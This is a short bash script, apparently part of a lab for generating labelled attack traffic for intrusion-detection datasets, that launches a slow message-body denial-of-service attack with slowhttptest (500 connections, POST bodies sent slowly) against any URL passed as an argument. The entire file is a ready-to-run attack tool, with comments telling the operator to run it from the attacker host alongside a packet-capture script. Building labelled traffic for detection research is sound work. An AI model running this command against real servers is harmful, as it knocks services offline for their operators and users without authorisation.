#!/usr/bin/env bash
# lab/attacks/dos-slowhttptest.sh — slow message-body DoS.  Label: DoS attacks-SlowHTTPTest
# RUN FROM THE ATTACKER HOST. Medium impact — keep short. Pair with:
#   sudo bash lab/capture.sh --label "DoS attacks-SlowHTTPTest" --duration 60 --attacker-ip <this host>
set -euo pipefail
TARGET="${1:?usage: dos-slowhttptest.sh <http(s)://host> [seconds]}"
SECS="${2:-40}"
command -v slowhttptest >/dev/null || { echo "need slowhttptest"; exit 1; }
echo "slow-body $TARGET for ${SECS}s ..."
slowhttptest -c 500 -B -i 10 -r 50 -t POST -u "$TARGET" -x 24 -p 3 -l "$SECS" || true
echo "done."
